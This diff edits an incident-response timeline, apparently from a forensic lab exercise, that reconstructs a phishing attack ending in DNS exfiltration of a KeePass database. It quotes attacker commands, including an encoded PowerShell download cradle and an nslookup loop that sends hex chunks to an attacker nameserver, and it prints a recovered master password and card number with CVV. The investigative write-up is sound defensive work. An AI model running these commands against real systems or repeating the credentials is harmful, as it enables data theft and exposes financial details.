@@ -23,7 +23,7 @@ This timeline reconstructs the entire multi-stage attack chronologically by synt
 | 6 | 2023-01-13 09:25:35 | Email delivered to Exchange inbox | `dump.eml` transit headers | Message delivered directly to Julianne Westcott without quarantine. |
 | 7 | Time not logged | Attachment unzipped and LNK launched | Host Artifacts | Victim extracts `Invoice.zip` with `Invoice2023!` and double-clicks `Invoice_20230103.lnk`. |
 | 8 | 2023-01-13 17:10:07 | Stage-1 fileless download cradle executed | `powershell.json` EID 4104 | Shortcut triggers `powershell.exe -nop -windowstyle hidden -enc ...` executing `Net.WebClient.DownloadString`. |
-| 9 | 2023-01-13 17:10:07 | Payload server delivers stage-2 implant | `capture.pcapng` Frame 33256 | Workstation fetches `http://files.bpakcaging.xyz/update`. Server responds `HTTP/1.1 200 OK` (`Server: SimpleHTTP/0.6 Python/3.10.7`). |
+| 9 | 2023-01-13 17:10:09 | Payload server delivers stage-2 implant | `capture.pcapng` Frame 33256 | Workstation fetches `http://files.bpakcaging.xyz/update`. Server responds `HTTP/1.0 200 OK` (`Server: SimpleHTTP/0.6 Python/3.10.7`, `Content-Length: 522`). |
 | 10 | 2023-01-13 17:10:09 | In-memory C2 polling beacon established | `powershell.json` Record 536 / `capture.pcapng` | Workstation polls `http://cdn.bpakcaging.xyz:8080/b86459bb` (`159.89.205.40`) every 0.8s with header `X-38d2-8f49: 8cce49b0-b86459bb-27fe2489`. |
 | 11 | 2023-01-13 17:12:17 | Attacker attempts Seatbelt download via GitHub | `powershell.json` Record 553 | Downloads `Invoke-Seatbelt.ps1` from GitHub repository; fails due to restricted outbound access or script errors. |
 | 12 | 2023-01-13 17:18:05 | Attacker fetches and executes Seatbelt binary | `powershell.json` Record 630 | Attacker downloads `http://files.bpakcaging.xyz/sb.exe` and runs `Seatbelt.exe -group=user;pwd` for host reconnaissance. |
@@ -37,7 +37,7 @@ This timeline reconstructs the entire multi-stage attack chronologically by synt
 | 20 | 2023-01-13 17:32:23 | Raw bytes converted to hexadecimal | `powershell.json` Record 768 | Executes `($bytes|ForEach-Object ToString X2) -join ''` producing 4,412 hex characters. |
 | 21 | 2023-01-13 17:32:41 | Attacker launches DNS exfiltration loop | `powershell.json` Record 774 | PowerShell executes loop splitting hex into 50-character chunks: `nslookup -q=A "$line.bpakcaging.xyz" 167.71.211.113`. |
 | 22 | 2023-01-13 17:32:41 – 17:34:38 | DNS tunneling traffic observed on wire | `capture.pcapng` frames 47767–48712 | 89 deduplicated hex chunks transmitted to rogue authoritative nameserver `167.71.211.113`. Exfiltration successful. |
-| 23 | Post-Incident Analysis | Forensic Carving of KeePass Database | `capture.pcapng` DNS Carving | DFIR team carves 2,206 bytes (`protected_data_carved.kdbx`), verifies KeePass 2.x header `03 D9 A2 9A 67 FB 4B B5`. |
+| 23 | Post-Incident Analysis | Forensic Carving of KeePass Database | `capture.pcapng` DNS Carving | Analyst carves 2,206 bytes (`protected_data_carved.kdbx`), verifies KeePass 2.x header `03 D9 A2 9A 67 FB 4B B5`. |
 | 24 | Post-Incident Analysis | Database Decryption & Asset Confirmation | `keepassxc-cli` | Database unlocked with `%p9^3!lL^Mz47E2GaT^y`, confirming compromise of Quick Logistics corporate card `4024007128269551` (Exp: 03/2028, CVV: 970). |
 
 ---
